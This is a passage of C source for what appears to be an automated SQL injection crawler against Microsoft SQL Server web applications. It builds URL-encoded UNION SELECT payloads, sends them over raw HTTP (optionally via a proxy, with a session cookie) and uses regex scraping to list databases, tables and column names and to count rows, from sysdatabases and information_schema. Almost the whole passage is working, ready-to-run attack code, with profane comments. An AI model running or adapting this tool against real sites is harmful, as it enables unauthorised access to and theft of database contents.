     if (strncmp(cfgopts.variables, "\n", 1)) {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET %s%s%s%s%%20union%%20select%%20", cfgopts.url, cfgopts.variables, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len); // heh still
     } else {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET %s%s%s%%20union%%20select%%20", cfgopts.url, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len);
     }
  }

  /* start teh tmpbuf2 cos like its different than the third one which will be used for the non-count/name, shit i fucking stopped caring */
  /****************/

  for (i = 1; i <= cfgopts.select_num; i++) {

      if (i == cfgopts.select_num) {
         len = strlen(numb);
         strncat(tmpbuf2, numb, len);
         break;
      }

      len = strlen(numbs);
      strncat(tmpbuf2, numbs, len);
  }
  /* so basically our buff looks like gay.asp?id=1 union select count(count(*)%20as%20char(15))%20" ... */
  /* end tmpbuf                                                                                         */
  /******************************************************************************************************/




  /* tmpbuf3 */
  for (i = 1; i <= cfgopts.select_num; i++) {

      if (i == cfgopts.select_num) {
         len = strlen(name);
         strncat(tmpbuf3, name, len);
         break;
      }

      len = strlen(numbs);
      strncat(tmpbuf3, names, len);
  }
  /* now tmpbuf3 looks like union select name ... */
  /* heh                                          */
  /************************************************/


  /* BEGIN LOOPING DATABASE NAMES VIA NUMB_DB */
  for (i = 0; i <= numb_db; i++) {                      // ok our first main loop
      if (db[i].dbname == NULL) {
         printf("you know you're fucking null so stop fucking around");
         continue;
      } else if (strlen((char *)db[i].dbname) == 0) {
        continue;
      }

      bzero(&recvbuf, sizeof(recvbuf));
      bzero(&tmpbuf, sizeof(tmpbuf));
      bzero(&sendbuf, sizeof(sendbuf));
      if (strncmp("model", (char *)db[i].dbname, 5) == 0 || strncmp("msdb", (char *)db[i].dbname, 4) == 0 || strncmp("tempdb", (char *)db[i].dbname, 6) == 0) {
         continue;
      } 

      /* Begin looping table name/numbers via j */
      for (j = 0; j <= db[i].table_num; j++) { 
         if ((char *)db[i].tables[j].table_name == NULL) {
            printf("jesus this sucks\n");
            continue;
         } else if (strlen((char *)db[i].tables[j].table_name) == 0) {
            continue;
         }
          
	 bzero(&sendbuf, sizeof(sendbuf));
	 fprintf(stderr, "db: %s table_name: %x %s \n", db[i].dbname, *db[i].tables[j].table_name, db[i].tables[j].table_name);
         len = strlen(tmpbuf2);
         strncat(sendbuf, tmpbuf2, len);                        // strncat tmpbuf2 which contains everything before 'from ...'


         snprintf(tmpbuf, sizeof(tmpbuf), "from%%20%s.information_schema.columns%%20where%%20table_name=\'%s\'",db[i].dbname, db[i].tables[j].table_name); 
         len = strlen(tmpbuf);
         strncat(sendbuf, tmpbuf, len);
         if (debug == 1) {
            printf("\n++++++++++++++++++++++++++NUMBERS+++++++++++++++++++++++++++++++++\n");
            printf("%s%s\n", sendbuf, cfgopts.end);
            printf("\n++++++++++++++++++++++++++NUMBERS+++++++++++++++++++++++++++++++++\n");
         }

	 db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie);

         if (debug == 1) {
            printf("\n\n-------------------------RECVNUM-----------------------------------------------\n");
            printf("%s", recvbuf);
            printf("\n\n-------------------------RECVNUM-----------------------------------------------\n");
         }

         if (stripdata(recvbuf, data_to_add) == 1) {
             fprintf(stderr, "Error finding the number of tables\n");
             exit(2);
         }
         db[i].tables[j].column_num = strtoul(data_to_add, NULL, 0);
         db[i].tables[j].columns = (column_t *)malloc(sizeof(column_t) * db[i].tables[j].column_num);
         if ( db[i].tables[j].columns == NULL) {
            fprintf(stderr, "Error mallocing tables for db[%d] ;/\n", i);
            exit(3);
         }
   	 memset(db[i].tables[j].columns, 0, sizeof(column_t) * db[i].tables[j].column_num); // clean out the columns so we can check for nulls
	
         bzero(&sendbuf, sizeof(sendbuf));                      // reset sendbuf to zero

         len = strlen(tmpbuf3);
         strncat(sendbuf, tmpbuf3, len);                        // strncat tmpbuf2 which contains everything before 'from ...'

         bzero(&recvbuf, sizeof(recvbuf));
         bzero(&tmpbuf, sizeof(tmpbuf));
	
         snprintf(tmpbuf, sizeof(tmpbuf), "from%%20%s.information_schema.columns%%20where%%20table_name=\'%s\'", db[i].dbname, db[i].tables[j].table_name);
         len = strlen(tmpbuf);
         strncat(sendbuf, tmpbuf, len);

	 if (debug == 1) {
            printf("\n++++++++++++++++++++++++1st Name COLUMNS+++++++++++++++++++++++++++++++++++\n");
            printf("%s%s%s\n", sendbuf, cfgopts.end, recvbuf);
            printf("\n++++++++++++++++++++++++1st Name COLUMNS+++++++++++++++++++++++++++++++++++\n");
         }
 
	 db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie);

         if (debug == 1) {
            printf("\n\n---------------------------1st name Results COLUMNS---------------------------------------------\n");
            printf("%s", recvbuf);
            printf("\n\n---------------------------1st name Results COLUMNS---------------------------------------------\n");
         }

         if (stripdata(recvbuf, data_to_add) == 1 || check_done(recvbuf) != 0) {
             fprintf(stderr, "Error finding the first table_name\n");
             continue;
         }

         bzero(&sendbuf, sizeof(sendbuf));   			// reset sendbuf to zero

         len = strlen(tmpbuf3);	
         strncat(sendbuf, tmpbuf3, len);			// strncat tmpbuf3 which contains everything before 'from ...'

         snprintf(tmpbuf, sizeof(tmpbuf), "from%%20%s.information_schema.columns%%20where%%20table_name<>\'%s\'", db[i].dbname, db[i].tables[j].table_name); // tac this on
         len = strlen(tmpbuf);
         strncat(sendbuf, tmpbuf, len);

         bzero(&recvbuf, sizeof(recvbuf));
         bzero(&tmpbuf, sizeof(tmpbuf));

         /* Start looping column_num via l */
         for (l = 0; l <= db[i].tables[j].column_num; l++) {
             if ((char *)db[i].tables[j].table_name == NULL) {
                printf("HAHAAHEHAHEHAHEHAHAEHEAHEAAHEAHEHEAEAHEAHEAHEAHEAHHEAHEAHEAEAHEAHHAEHAE\n");
                continue;
             } else if (strlen((char *)db[i].tables[j].table_name) == 0) {
                printf("HAHAAHEHAHEHAHEHAHAEHEAHEAAHEAHEHEAEAHEAHEAHEAHEAHHEAHEAHEAEAHEAHHAEHAE2222222222222\n");
                continue;
             }

             memcpy(&db[i].tables[j].columns[l].column_name, data_to_add, BUF); // copy in the data_to_add to our data struct
	     if (debug == 1) printf("COLUMN_NAME: %s AND DATA_TO_ADD: %s\n", db[i].tables[j].columns[l].column_name, data_to_add);
             memset(data_to_add, 0, 500);
             bzero(&recvbuf, sizeof(recvbuf));
             bzero(&tmpbuf, sizeof(tmpbuf));
            
             snprintf(tmpbuf, sizeof(tmpbuf), "%%20and%%20column_name<>\'%s\'", db[i].tables[j].columns[l].column_name);

             len = strlen(tmpbuf);
             strncat(sendbuf, tmpbuf, len);

    	     bzero(&tmpbuf, sizeof(tmpbuf));
	     if (debug == 1) {
                printf("\n++++++++++++++++++++++++Column %d Run+++++++++++++++++++++++++++++++++++\n", l);
                printf("%s%s%s\n", sendbuf, cfgopts.end, recvbuf);
                printf("\n++++++++++++++++++++++++Column %d Run+++++++++++++++++++++++++++++++++++\n", l);
             }

	     db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie);

             if (debug == 1) {
                printf("\n\n---------------------------Column %d Run Results---------------------------------------------\n", l);
                printf("%s", recvbuf);
                printf("\n\n---------------------------Column %d Run Results---------------------------------------------\n", l);
             }
             if (stripdata(recvbuf, data_to_add) == 1 || check_done(recvbuf) != 0) {
                 fprintf(stderr, "Error finding the column_name\n");
                 continue;
             }

         } //close columnforloop


        } //close tableforloop

   } //close dbforloop

  return(0);
}

/***************************************/
/* get column data ewns almost done :D */
/***************************************/

int gather_data_get(int sockfd, int n, char *cookie, char *hostname)
{
  char tmpbuf[BUF * 2], tmpbuf2[BUF * 2], tmpbuf3[BUF * 2], tmpbuf4[BUF * 2], recvbuf[BIGBUF], sendbuf[BIGBUF];
  char numbs_seg1[] = "cast(count("; // converts the numbers to ascii (inside sql)
  char numbs_seg2[] = ")%20as%20char(15))%20"; // same but this will be the final query
  char numbs_seg3[] = ")%20as%20char(15)),";
  char name_buf[100]; 
  char names_buf[103];

  int len, i, j, l, m;
  char *data_to_add;
  data_to_add = (char *)malloc(500);                           
  if (data_to_add == NULL){
     fprintf(stderr, "Error mallocing data_to_add\n");
     exit(3);
  }

  bzero(&name_buf, 100);
  bzero(&names_buf, 100);
  bzero(&sendbuf, sizeof(sendbuf));
  bzero(&recvbuf, sizeof(recvbuf));
  bzero(&tmpbuf, sizeof(tmpbuf));
  bzero(&tmpbuf2, sizeof(tmpbuf2));
  bzero(&tmpbuf3, sizeof(tmpbuf3));
  

  if (proxy_use == 1) {
     if (strncmp(cfgopts.variables, "\n", 1)) {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET http://%s:%d/%s%s%s%s%%20union%%20select%%20", hostname, port, cfgopts.url, cfgopts.variables, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len); // since we need this for both buff's just strncpy the shizzle
     } else {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET http://%s:%d/%s%s%s%%20union%%20select%%20", hostname, port, cfgopts.url, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len); // heh
     }
  } else {
     if (strncmp(cfgopts.variables, "\n", 1)) {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET %s%s%s%s%%20union%%20select%%20", cfgopts.url, cfgopts.variables, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len); // heh still
     } else {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET %s%s%s%%20union%%20select%%20", cfgopts.url, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len);
     }
  }

  /* Ok this loops fucking insane, i can't think of any other way to do this shit and if this works i'll be bloody fucking amazed */

  for (i = 0; i <= numb_db; i++) { 			// db[i]....
      if ((char *)db[i].dbname == NULL) {
          continue;
      } else if (strlen((char *)db[i].dbname) == 0) {
          continue;
      }
/*      if (strncmp("model", (char *)db[i].dbname, 5) == 0 || strncmp("msdb", (char *)db[i].dbname, 4) == 0 || strncmp("tempdb", (char *)db[i].dbname, 6) == 0) {
         continue;
      }
*/
      if (strncmp("master", (char *)db[i].dbname, 6))
         continue;
       
      for (j = 0; j <= db[i].table_num; j++) {		// db[i].tables[j]....
          if ((char *)db[i].tables[j].table_name == NULL) {
             continue;
          }
          if (strlen((char *)db[i].tables[j].table_name) == 0) {
             continue;
          }
 
          for (l = 0; l <= db[i].tables[j].column_num; l++) {	// db[i].tables[j].columns[l].....
	      
               bzero(&name_buf, 100);
	       bzero(&names_buf, 100);
 	       if ((char *)db[i].tables[j].columns[l].column_name == NULL) {
                  continue;
               }
               if (strlen((char *)db[i].tables[j].columns[l].column_name) == 0) {
		  continue;
               }
             
	       len = strlen((char *)db[i].tables[j].columns[l].column_name);
	       strncpy(name_buf, (char *)db[i].tables[j].columns[l].column_name, len);	
	       for (m = 1; m <= cfgopts.select_num; m++) {
                   if ((char *)db[i].tables[j].columns[m].column_name == NULL) {
                      continue;
                   } else if (strlen((char *)db[i].tables[j].columns[m].column_name) == 0) {
                      continue;
                   } 
		   bzero(&sendbuf, sizeof(sendbuf));
		   bzero(&recvbuf, sizeof(recvbuf));

		   len = strlen(tmpbuf2);
		   strncpy(sendbuf, tmpbuf2, len);
 
	           if (m == cfgopts.select_num) {
		      len = strlen(numbs_seg1);
		      strncat(sendbuf, numbs_seg1, len);
	  	      len = strlen(name_buf);
		      strncat(sendbuf, name_buf, len);
		      len = strlen(numbs_seg2);
		      strncat(sendbuf, numbs_seg2, len);
		      break;
		   }

		   len = strlen(numbs_seg1);
		   strncat(sendbuf, numbs_seg1, len);
		   len = strlen(name_buf);
		   strncat(sendbuf, name_buf, len);
		   len = strlen(numbs_seg3);
		   strncat(sendbuf, numbs_seg3, len);
                }
		
		/* Ok so now we are at union select count(column1),count(column1) ... */

		snprintf(tmpbuf, sizeof(tmpbuf), "from%%20%s.dbo.\"%s\"", db[i].dbname, db[i].tables[j].table_name);
		len = strlen(tmpbuf);
		strncat(sendbuf, tmpbuf, len);
		bzero(&tmpbuf, sizeof(tmpbuf));


		/* now: union select count(column1) from master.dbo.table1... this should give us the amount of records for this col */
		printf("##############################Get Size of Data#########################\n");
                printf("Where we are at: d: %d t: %d c: %d\n", i, j, l);
                printf("#######################################################################\n");
	   	printf("%s%s\n", sendbuf, cfgopts.end);
                db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie);
		printf("##############################Results Size Of##########################\n");
		printf("%s\n", recvbuf);

		if (stripdata(recvbuf, data_to_add) == 1) {
		   fprintf(stderr, "Error finding the number of rows for db: %s table: %s column: %s ;/\n", db[i].dbname, db[i].tables[j].table_name, db[i].tables[j].columns[l].column_name);
      		   continue; 
  		}

  	 	db[i].tables[j].columns[l].data_num = strtoul(data_to_add, NULL, 0);
  		db[i].tables[j].columns[l].data = (data_t *)malloc(sizeof(data_t) * db[i].tables[j].columns[l].data_num);
  	        if (db[i].tables[j].columns[l].data == NULL) {
        	     fprintf(stderr, "Error mallocing data for db: %s table: %s column: %s ;/\n", db[i].dbname, db[i].tables[j].table_name, db[i].tables[j].columns[l].column_name);
            	     exit(3);
        	}

		bzero(&sendbuf, sizeof(sendbuf));
		bzero(&recvbuf, sizeof(recvbuf));


		printf("data for db: %s table: %s column: %s size: %d;/\n", db[i].dbname, db[i].tables[j].table_name, db[i].tables[j].columns[l].column_name, db[i].tables[j].columns[l].data_num);

          } // close column_num loop
      } // close table_num loop
   } // close numb_db loop	
	    	

              
  return(0);
}



/**********************************/
/* post information_schema.tables */
/**********************************/
 
int gather_tables_post(int sockfd, int n, char *cookie, char *hostname)
{
  char tmpbuf[BUF], tmpbuf2[BUF * 2], tmpbuf3[BUF * 2], recvbuf[BIGBUF], sendbuf[BIGBUF];
  char numbs[] = "cast(count(*)%20as%20char(15)),";
  char numb[] = "cast(count(*)%20as%20char(15))%20";
  char names[] = "name,";
  char name[] = "name%20";
  int len, i;
  char *data_to_add;
  data_to_add = (char *)malloc(500);
  if (data_to_add == NULL){
     fprintf(stderr, "Error mallocing data_to_add\n");
     exit(3);
  }
  bzero(&sendbuf, sizeof(sendbuf));
  bzero(&recvbuf, sizeof(recvbuf));
  bzero(&tmpbuf, sizeof(tmpbuf));
  bzero(&tmpbuf2, sizeof(tmpbuf2));
  bzero(&tmpbuf3, sizeof(tmpbuf3));



  if (proxy_use == 1) {
     if (strncmp(cfgopts.variables, "\n", 1)) {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "POST http://%s:%d%s HTTP/1.0\r\nHost: %s\r\nCookie: %s\r\n%s%s%s%%20union%%20select%%20", hostname, port, cfgopts.url, hostname, cookie, cfgopts.variables, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len); // since we need this for both buff's just strncpy the shizzle
     } else {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "POST http://%s:%d%s HTTP/1.0\r\nHost: %s\r\nCookie: %s\r\n%s%s%%20union%%20select%%20", hostname, port, cfgopts.url, hostname, cookie, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len); // heh
     }
  } else {
     if (strncmp(cfgopts.variables, "\n", 1)) {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET %s HTTP/1.0\r\nHost: %s\r\nCookie: %s\r\n%s%s%s%%20union%%20select%%20", cfgopts.url, hostname, cookie, cfgopts.variables, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len); // heh still
     } else {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET %s HTTP/1.0\r\nHost: %s\r\nCookie: %s\r\n%s%s%%20union%%20select%%20", cfgopts.url, hostname, cookie, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len);
     }
  }

  /* start teh first tmpbuf cos like its different than the second one which will be used for the non-count/name, shit i fucking stopped caring */
  /****************/

  for (i = 1; i <= cfgopts.select_num; i++) {

      if (i == cfgopts.select_num) {
         len = strlen(numb);
         strncat(tmpbuf2, numb, len);
         break;
      }

      len = strlen(numbs);
      strncat(tmpbuf2, numbs, len);
  }
  /* so basically our buff looks like &heh=1 union select count(count(*)%20as%20char(15))%20" ... */
  /* end tmpbuf                                                                                         */
  /******************************************************************************************************/




  /* tmpbuf numero deuce HAHA DEUCE WHAT THE DEUCE? HAHAHAHA */
  for (i = 1; i <= cfgopts.select_num; i++) {

      if (i == cfgopts.select_num) {
         len = strlen(name);
         strncat(tmpbuf3, name, len);
         break;
      }

      len = strlen(numbs);
      strncat(tmpbuf3, names, len);
  }
  /* now tmpbuf3 looks like union select name ... */
  /* heh                                          */
  /************************************************/



  len = strlen(tmpbuf2);
  strncpy(sendbuf, tmpbuf2, len); // copy everything from tmpbuf2 into our sendbuf (for our first request)

  snprintf(tmpbuf, sizeof(tmpbuf), "from%%20master.dbo.sysdatabases");

  len = strlen(tmpbuf);
  strncat(sendbuf, tmpbuf, len); // tack the from shit onto the end of our sendbuf


  if (debug == 1) {
     printf("\n++++++++++++++++++++++++++NUMBERS+++++++++++++++++++++++++++++++++\n");
     printf("%s\n", sendbuf);
     printf("\n++++++++++++++++++++++++++NUMBERS+++++++++++++++++++++++++++++++++\n");
  }

  db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie);

  if (debug == 1) {
     printf("\n\n-------------------------RECVNUM-----------------------------------------------\n");
     printf("%s", recvbuf);
     printf("\n\n-------------------------RECVNUM-----------------------------------------------\n");
  }

  if (stripdata(recvbuf, data_to_add) == 1) {
      fprintf(stderr, "Error finding the number of databases\n");
      exit(2);
  }

  /* here we malloc the db[] to whatever we got as a return result this way we know zactly how many db's */
  numb_db = strtoul(data_to_add, NULL, 0);
  db = (datab_t *)malloc(sizeof(datab_t)*numb_db);
  if (db == NULL) {
     fprintf(stderr, "Error mallocing db ;/\n");
     exit(3);
  }

  bzero(&sendbuf, sizeof(sendbuf));
  bzero(&recvbuf, sizeof(recvbuf));

  len = strlen(tmpbuf3);                // member the tmpbuf3 we made? :D
  strncpy(sendbuf, tmpbuf3, len);       // now our sendbuf is setup for name type request


  len = strlen(tmpbuf);
  strncat(sendbuf, tmpbuf, len); // tack this on again

  if (debug == 1) {
     printf("\n++++++++++++++++++++++++1st Name+++++++++++++++++++++++++++++++++++\n");
     printf("%s\n", sendbuf);
     printf("\n++++++++++++++++++++++++1st Name+++++++++++++++++++++++++++++++++++\n");
  }

  db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie);

  if (debug == 1) {
     printf("\n\n---------------------------1st name Results---------------------------------------------\n");
     printf("%s", recvbuf);
     printf("\n\n---------------------------1st name Results---------------------------------------------\n");
  }
  if (stripdata(recvbuf, data_to_add) == 1) {
      fprintf(stderr, "Error finding the database name\n");
      exit(2);
  }
        memcpy(&db[0].dbname, data_to_add, BUF); // we should have our first name in db[0].dbname probably 'master'

        memset(data_to_add, 0, 500);
        bzero(&recvbuf, sizeof(recvbuf));
        bzero(&tmpbuf, sizeof(tmpbuf));
        bzero(&sendbuf, sizeof(sendbuf));

        len = strlen(tmpbuf3);
        strncat(sendbuf, tmpbuf3, len);

        snprintf(tmpbuf, sizeof(tmpbuf), "from%%20master.dbo.sysdatabases%%20where%%20name<>\'%s\'", db[0].dbname);

        len = strlen(tmpbuf);
        strncat(sendbuf, tmpbuf, len);

        if (debug == 1) {
           printf("\n++++++++++++++++++++++++++++Where name+++++++++++++++++++++++++++++++\n");
           printf("%s\n", sendbuf);
           printf("\n++++++++++++++++++++++++++++Where name+++++++++++++++++++++++++++++++\n");
        }

        db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie);

        if (debug == 1) {
           printf("\n\n-------------------------------Where name results-----------------------------------------\n");
           printf("%s", recvbuf);
           printf("\n\n-------------------------------Where name results-----------------------------------------\n");
        }

        if (stripdata(recvbuf, data_to_add) == 1 || check_done(recvbuf) != 0) {
           fprintf(stderr, "Error finding the database name\n");
           exit(2);
        }
        bzero(&tmpbuf, sizeof(tmpbuf));

        /* START THE FUCKING LLOPPWPEOIEWURWEOPIURWET */
        for (i = 1; i <= numb_db; i++) {                        // Starting at 1 cos we have master in db[0], this fucked me up for a while heh :D
            memcpy(&db[i].dbname, data_to_add, BUF);
            memset(data_to_add, 0, 500);
            snprintf(tmpbuf, sizeof(tmpbuf), "%%20and%%20name%%20<>\'%s\'", db[i].dbname);
            len = strlen(tmpbuf);
            strncat(sendbuf, tmpbuf, len);

            bzero(&recvbuf, sizeof(recvbuf));
            bzero(&tmpbuf, sizeof(tmpbuf));
            memset(data_to_add, 0, 500);

            if (debug == 1) {
               printf("\n+++++++++++++++++++++++++++Run %d++++++++++++++++++++++++++++++++\n", i);
               printf("%s\n", sendbuf);
               printf("\n+++++++++++++++++++++++++++Run %d++++++++++++++++++++++++++++++++\n", i);
            }

            db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie);

            if (debug == 1) {
               printf("\n\n--------------------------------run %d res----------------------------------------\n", i);
               printf("%s", recvbuf);
               printf("\n\n--------------------------------run %d res----------------------------------------\n", i);
            }

            if (stripdata(recvbuf, data_to_add) == 1 || check_done(recvbuf) != 0) {
                fprintf(stderr, "Error finding the database name, We MUST BE DONE HAAHAHAH\n");
                break;
            }
        }

  return(0);
}


 

/*****************/
/* gaktz strntok */
/*****************/

int my_strntok(char *string,char *delim,char *dest, int destsize) {
        char *dptr;
        static char *sptr,*origstr;
        int found;

        if(string!=(char *)NULL) {
                sptr = string;
                origstr = string;
        }

        found=0;

        while((*sptr)&&(!found)) {
                dptr = delim;
                while((*sptr)&&(*dptr)&&(!found))
                        found = *sptr == *dptr++;
                if(!found)
                        sptr++;
        }

        if(!found) {
                return 0;
        }

        if(dest!=(char *)NULL) {

                if(sptr-origstr >= destsize) {
                        return 0;
                }
                memcpy(dest,origstr,sptr-origstr);
                dest[sptr-origstr] = 0;
        }

        sptr++;
        origstr = sptr;

        return 1;
}

int stripdata(char *recvbuf, char *data_to_add)
{
  const char *error;
  pcre *re;
  int erroffset;
  int ovector[OVECCOUNT];
  int rc, i;
  char tmpbuf[400]; 
  char *src,*dst;

  bzero(&tmpbuf, sizeof(tmpbuf));

  re = pcre_compile(
  //"Got product (.*)\\sThis product",
  cfgopts.regex,
  0,
  &error,
  &erroffset,
  NULL);

if (re == NULL)
   {
     printf("PCRE compilation failed: %s\n", error);
     return(1);
   }

rc = pcre_exec(
  re,
  NULL,
  recvbuf,
  (int)strlen(recvbuf),
  0,
  0,
  ovector,
  OVECCOUNT);


if (rc < 0)
  {
  switch(rc)
    {
    case PCRE_ERROR_NOMATCH: printf("No match\n"); break;
    default: if (debug == 1) printf("Matching error %d\n", rc); break;
    }
  return 1;
  }

for (i = 0; i < rc; i++)
  {
  char *substring_start = recvbuf + ovector[2*i];
  int substring_length = ovector[2*i+1] - ovector[2*i];
  snprintf(tmpbuf, sizeof(tmpbuf), "%.*s", substring_length, substring_start);
  if (debug == 1) { 
     printf("\nHEHEHEH:%2d: %.*s\n", i, substring_length, substring_start);
  }
  }
  if (tmpbuf == NULL) {
     return(1);
  }

 src = tmpbuf;
 dst = data_to_add;
 while(*src) {
         if(*src == ' ') {
                 *dst++ = '%';
                 *dst++ = '2';
                 *dst++ = '0';
                 src++;
         } else {
                 *dst++ = *src++;
         }
 }
*dst = 0;

  return(0);
}


int check_done(char *recvbuf)
{
  const char *error;
  pcre *re;
  int erroffset;
  int ovector[OVECCOUNT];
  int rc;

  re = pcre_compile(
  cfgopts.doneregex,
  0,
  &error,
  &erroffset,
  NULL);

if (re == NULL)
   {
     if (debug == 1) printf("PCRE compilation failed: %s\n", error);
     return(1);
   }

rc = pcre_exec(
  re,
  NULL,
  recvbuf,
  (int)strlen(recvbuf),
  0,
  0,
  ovector,
  OVECCOUNT);

      if (rc < 0)
           {
           switch(rc)
             {
             case PCRE_ERROR_NOMATCH: if (debug == 1) printf("No match\n"); return (0); break;
             default: if (debug == 1) printf("Matching error %d\n", rc); break;
             }
           return 1;
           }

         printf("Match succeeded\n");


         if (rc == 0)
           {
           rc = OVECCOUNT/3;
           if (debug == 1) printf("ovector only has room for %d captured substrings\n", rc - 1);
           }
  

  return(1);
}

int resolve(char *hostname)
{
        struct hostent *res;

        if (proxy_use == 1) {
  	   if(inet_pton(AF_INET, hostname, &proxyaddr.sin_addr)) {
              if ((res = gethostbyname(hostname)) == NULL) {
                 return(0);
              } 
              memcpy(&proxyaddr.sin_addr.s_addr, res->h_addr, res->h_length);
              return(1);
           }
        } else {
           if (inet_pton(AF_INET, hostname, &servaddr.sin_addr) <= 0) {
               if ((res = gethostbyname(hostname)) == NULL) {
		   return(0);
	       } 
 	       memcpy(&servaddr.sin_addr.s_addr, res->h_addr, res->h_length);
               return(1);
           }
        }
  return(1);
}



int usage(int argc, char **argv)
{
  fprintf(stderr, "\n\n\tSQL Crawler by wirepair@sh0dan.org\n");
  fprintf(stderr, "\n\tUsage: %s [-x <proxy> -t <proxy port>]  <host> -p <port>\n", argv[0]);
  fprintf(stderr, "\t\t-x and -t are optional\n\n"); 
  return(1);
}

int db_send_data(int sockfd, char *sendbuf, char *recvbuf, char *hostname, char *cookie)
{
  char headerbuf[350];
  

  bzero(&headerbuf, sizeof(headerbuf));
    if (proxy_use == 1) {
       snprintf(headerbuf, sizeof(headerbuf), " HTTP/1.0\r\nHost: %s\r\nCookie: %s\r\n\r\n", hostname, cookie);
    } else {
       snprintf(headerbuf, sizeof(headerbuf), " HTTP/1.0\r\nHost: %s\r\nCookie: %s\r\n\r\n", hostname, cookie);
    }


    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
       perror("heh socket probz");
       exit(7);
    }

	if (proxy_use == 1) {
     	   if (connect(sockfd, (struct sockaddr *)&proxyaddr, sizeof(proxyaddr)) < 0) {
	      perror("connect proxy issues!\n");
	      exit(7);
	   }
        } else {
           if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
              perror("connect issues!");
              exit(7);
           }
	}
   
        if (cfgopts.postget == 1) {
	   send(sockfd, sendbuf, strlen(sendbuf),0);
           send(sockfd, cfgopts.end, strlen(cfgopts.end),0);
           recv(sockfd, recvbuf, BIGBUF,0);
        } else {
           send(sockfd, sendbuf, strlen(sendbuf),0);
           send(sockfd, cfgopts.end, strlen(cfgopts.end),0);
           send(sockfd, headerbuf, strlen(headerbuf),0);
           recv(sockfd, recvbuf, BIGBUF,0);
        }

       close(sockfd);

  return(0);
}
